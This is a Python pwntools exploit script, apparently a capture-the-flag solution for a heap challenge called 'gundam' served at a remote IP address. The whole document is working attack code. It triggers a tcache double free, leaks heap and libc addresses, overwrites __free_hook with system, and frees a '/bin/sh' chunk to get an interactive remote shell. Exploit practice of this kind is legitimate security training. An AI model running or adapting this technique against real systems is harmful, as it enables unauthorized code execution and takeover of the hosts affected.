from pwn import *

debug=0
context.log_level='debug'
e=ELF('./libc.so')
if debug:
    p=process('gundam',env={'LD_PRELOAD':'./libc.so'})
    gdb.attach(p)
else:
    p=remote('47.75.37.114', 9999)

def ru(x):
    return p.recvuntil(x)

def se(x):
    p.send(x)

def build(name,tp):
    se('1\n')
    ru('The name of gundam :')
    se(name)
    ru('The type of the gundam :')
    se(str(tp)+'\n')
    ru('choice : ')

def visit():
    se('2\n')
    data=ru('1 . ')
    ru('choice : ')
    return data

def destory(idx,wait=True):
    se('3\n')
    ru('Which gundam do you want to Destory:')
    se(str(idx)+'\n')
    if wait:
        ru('choice : ')

def blow_up():
    se('4\n')
    ru('choice : ')


for i in range(9):
    build('a',1)
for i in range(8):
    destory(i)
blow_up()
build('a',1)

for i in range(3):
    build('a',1)

data=visit()
t1=data.index("[0] :")+5
heap=u64(data[t1:t1+6]+'\x00\x00')-0x861

heap_libc=heap+0xb50

destory(0)
destory(0)  #double free

build(p64(heap_libc),1)
build('a',1)
build('a',1)


data=visit()
t2=data.index("[6] :")+5
libc=u64(data[t2:t2+6]+'\x00\x00')

base=libc-0x3DAC61

free_hook=base+e.symbols['__free_hook']
system=base+e.symbols['system']

print(hex(heap))
print(hex(base))

destory(2)
blow_up()

destory(1)
destory(1)



build(p64(free_hook),1)
build('/bin/sh',1)
build(p64(system),1)

destory(0,False)
print(hex(free_hook))

p.interactive()
